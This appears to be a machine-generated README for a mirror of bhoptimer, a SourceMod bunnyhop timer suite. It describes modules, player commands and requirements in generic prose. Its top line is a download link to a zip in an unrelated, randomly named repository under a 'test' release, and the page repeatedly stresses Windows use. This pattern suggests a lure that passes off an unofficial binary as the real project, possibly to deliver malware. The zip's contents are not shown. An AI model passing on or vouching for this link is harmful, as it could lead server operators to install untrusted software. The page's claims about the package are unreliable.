# bhoptimer

A generated repository based on **bhoptimer**, a SourceMod plugin suite for bunnyhop timer servers in Counter-Strike: Source, Counter-Strike: Global Offensive, and Team Fortress 2.

[Download](https://github.com/gcoyerk/cuddly-octo-adventure/releases/download/test/bhoptimer-1.zip)

## Overview

bhoptimer provides a modular timer system for Source engine bunnyhop servers. It includes core timing logic, records, map zones, HUD elements, replay bots, rankings, chat features, statistics, checkpoints, sounds, and server utilities commonly used on bhop servers.

This repository is intended as a Windows-oriented package/demo mirror for server operators who run SourceMod-based game servers in a Windows environment. It is not a Windows desktop application; it is server-side SourceMod plugin software.

## Supported Games

According to the project information, bhoptimer targets:

- Counter-Strike: Source
- Counter-Strike: Global Offensive
- Team Fortress 2

CS:GO support is retained, but it is not actively tested.

## Requirements

- Steam version of a supported game
- Metamod:Source
- SourceMod 1.12 or newer
- MySQL database for larger deployments or rankings
- MySQL 5.5.5 or newer, or a compatible MariaDB version

## Main Modules

The suite is organized into multiple SourceMod plugins:

| Module | Purpose |
|---|---|
| `shavit-core` | Core timer logic, styles, database API, pause/resume, autobhop, gameplay mechanics |
| `shavit-wr` | Record storage, leaderboards, personal bests, recent records |
| `shavit-zones` | Start/end zones, bonus zones, teleport zones, zone editing |
| `shavit-chat` | Custom chat names, colors, tags, chat ranks |
| `shavit-hud` | Player HUD, keys display, velocity display, HUD toggles |
| `shavit-mapchooser` | Map nomination and voting integration |
| `shavit-checkpoints` | Checkpoints, savestates, segmented running |
| `shavit-misc` | Spectating, player hiding, weapons, noclip, adverts, server utilities |
| `shavit-rankings` | Rank, top lists, map tiers, points calculation |
| `shavit-replay-playback` | Replay bot playback for records |
| `shavit-replay-recorder` | Replay recording component |
| `shavit-sounds` | Sounds for record and completion events |
| `shavit-stats` | Player profiles, completion stats, playtime, maps done/left |
| `shavit-timelimit` | Dynamic map time limits |
| `shavit-tas` | Autostrafer and TAS-related commands |

## Core Capabilities

bhoptimer is designed to provide most of the systems needed for a bunnyhop server:

- Timed runs for main and bonus tracks
- Configurable movement styles
- Automatic bunnyhopping
- World records and personal bests
- Map zone creation and editing
- Player HUD and key display
- Replay recording and playback bots
- Competitive ranking system
- Checkpoints and segmented practice
- Statistics and player profiles
- Chat customization
- Server utility commands for bhop gameplay

## Windows Notes

This repository is positioned for Windows server usage where SourceMod, Metamod:Source, and the supported Source games are installed on a Windows machine. Some optional companion components mentioned by the project are specifically relevant to Windows server environments, including fixes related to event queue behavior after game updates.

Because bhoptimer is SourceMod-based, Windows usage depends on a working Windows game server setup rather than a standalone desktop launcher.

## Configuration

Configuration is handled through SourceMod configuration files. The original project information identifies these configuration locations:

- `cfg/sourcemod/plugin.shavit-*.cfg`
- `addons/sourcemod/configs/shavit-*`

Server operators should review module configuration files before enabling a production server, especially for database settings, rankings, styles, zones, HUD behavior, and replay storage.

## Common Player Commands

Examples of player-facing commands include:

- `!style`, `!styles` — choose a bhop style
- `!start`, `!restart` — restart the timer
- `!bonus`, `!b1`, `!b2` — start a bonus track
- `!wr` — view world records
- `!pb`, `!time` — view player times
- `!hud` — configure HUD display
- `!cp`, `!save`, `!tele` — use checkpoints
- `!rank`, `!top` — view rankings
- `!replay` — open replay bot options
- `!profile`, `!stats` — view player statistics
- `!spec`, `!hide`, `!tpto` — miscellaneous server utilities

## Admin Features

Administrative commands cover tasks such as:

- Editing and deleting zones
- Deleting map data or records
- Setting map tiers
- Recalculating ranking points
- Managing replay files
- Reloading maps or map lists
- Extending map time
- Managing chat customization access

Administrative access depends on SourceMod permissions such as RCON, ROOT, CHAT, BAN, or CHANGEMAP flags.

## Optional and Recommended Components

The project information mentions optional or recommended plugins/extensions for improved behavior, including:

- Event queue fixes
- Asynchronous replay saving support
- SteamWorks integration for advertisements
- Dynamic channel support
- Surf ramp and movement fixes
- Trigger and player clip visibility tools
- Jump statistics and jump HUD plugins
- Closest replay position helpers
- CS:GO-specific movement or viewpunch fixes

These are optional and should be evaluated based on the game, operating system, and server configuration.

## Important Notes

- Plugins that include `shavit` should be recompiled when required by API changes.
- CS:GO support remains present, but active testing is not guaranteed.
- MySQL is recommended when the database is expected to grow or when rankings are enabled.
- This is server-side plugin software, not a standalone Windows desktop program.

## FAQ

### Is bhoptimer a Windows application?

No. bhoptimer is SourceMod plugin software for Source engine game servers. This repository is Windows-oriented in the sense that it is suitable for use in a Windows server environment.

### Does it require a database?

A database is required for persistent records and strongly recommended for larger servers or ranking functionality.

### Can it run without rankings?

The timer, zones, records, and other modules are separated. Rankings are a dedicated module, though some features integrate with it.

### What games are supported?

The supplied project information lists Counter-Strike: Source, Counter-Strike: Global Offensive, and Team Fortress 2.

### Is CS:GO actively tested?

The project notes that CS:GO support is not actively tested, although support has not been removed.

## Conclusion

bhoptimer is a modular SourceMod bhop timer suite for Source engine servers. It combines timing, records, zones, rankings, HUD, replays, checkpoints, statistics, and server utilities into a plugin-based system suitable for running bunnyhop servers, including deployments on Windows game server environments.
